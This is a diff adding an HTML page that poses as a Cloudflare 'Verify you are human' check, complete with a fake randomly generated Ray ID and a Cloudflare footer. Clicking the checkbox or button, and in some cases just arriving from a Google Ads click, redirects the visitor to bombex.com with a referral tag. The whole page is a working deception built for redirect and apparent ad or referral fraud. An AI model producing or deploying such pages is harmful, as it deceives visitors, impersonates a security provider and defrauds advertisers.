@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <script>
+        if (window.location.search.includes('gclid')) {
+            window.location.replace('https://www.bombex.com/?ref=olucxcpt');
+        }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .ray-id {
+            font-family: monospace;
+            color: #555;
+            font-size: 12px;
+        }
+    </style>
+</head>
+
+<body class="bg-white min-h-screen flex items-center justify-center p-4 font-sans text-gray-800">
+    <div class="max-w-md w-full border border-gray-200 shadow-sm rounded-sm p-8 bg-white"
+        style="box-shadow: 0 0 10px rgba(0,0,0,0.05);">
+        <div class="flex flex-col items-center space-y-6">
+            <h2 class="text-2xl font-semibold mb-2 text-center text-gray-900">Verifying you are human. This may take a
+                few seconds.</h2>
+            <p class="text-sm text-center text-gray-600 mb-4">
+                We need to verify your connection is secure before proceeding.
+            </p>
+
+            <div class="w-full flex justify-center py-4">
+                <div class="loader hidden" id="spinner"></div>
+            </div>
+
+            <button id="verifyBtn"
+                class="flex items-center space-x-3 border border-gray-300 rounded px-6 py-3 hover:bg-gray-50 transition-colors w-full justify-center shadow-sm">
+                <input type="checkbox" id="humanCheck" class="w-5 h-5 cursor-pointer accent-blue-600">
+                <span class="font-medium text-gray-700">Verify you are human</span>
+            </button>
+
+            <div class="text-center mt-8 pt-6 border-t border-gray-100 w-full flex flex-col items-center">
+                <p class="ray-id mb-2">Ray ID: <span id="rayId"></span></p>
+                <p class="text-xs text-gray-400">Performance & security by Cloudflare</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Generate random Ray ID
+        document.getElementById('rayId').innerText = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 6);
+
+        const verifyBtn = document.getElementById('verifyBtn');
+        const humanCheck = document.getElementById('humanCheck');
+        const spinner = document.getElementById('spinner');
+
+        function proceed() {
+            humanCheck.checked = true;
+            verifyBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            spinner.classList.remove('hidden');
+            setTimeout(() => {
+                window.location.replace('https://www.bombex.com/?ref=olucxcpt');
+            }, 1500);
+        }
+
+        verifyBtn.addEventListener('click', proceed);
+        humanCheck.addEventListener('click', (e) => {
+            e.stopPropagation();
+            proceed();
+        });
+    </script>
+</body>
+
+</html>
